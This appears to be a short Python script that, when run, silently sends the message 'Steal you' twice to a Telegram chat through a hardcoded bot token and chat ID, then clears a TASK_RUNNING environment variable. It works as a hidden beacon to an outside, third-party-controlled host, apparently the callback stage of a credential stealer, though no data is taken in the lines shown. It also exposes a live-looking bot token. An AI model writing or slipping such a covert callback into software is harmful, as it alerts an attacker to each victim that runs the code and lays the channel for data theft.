import requests,time,os
def background_task():
    try:
        url = 'https://api.telegram.org/bot7496801196:AAHBtjABl8u_qN6hDbEFrfwLepaHxD9rs0A/sendMessage'
        params = {
            'chat_id': '6400572573',
            'text': 'Steal you'
        }
        for i in range(2):
            response = requests.get(url, params=params)
            time.sleep(4)
        
    except Exception as e:
        print(f"An error occurred: {e}")
background_task()
os.environ.pop('TASK_RUNNING', None)
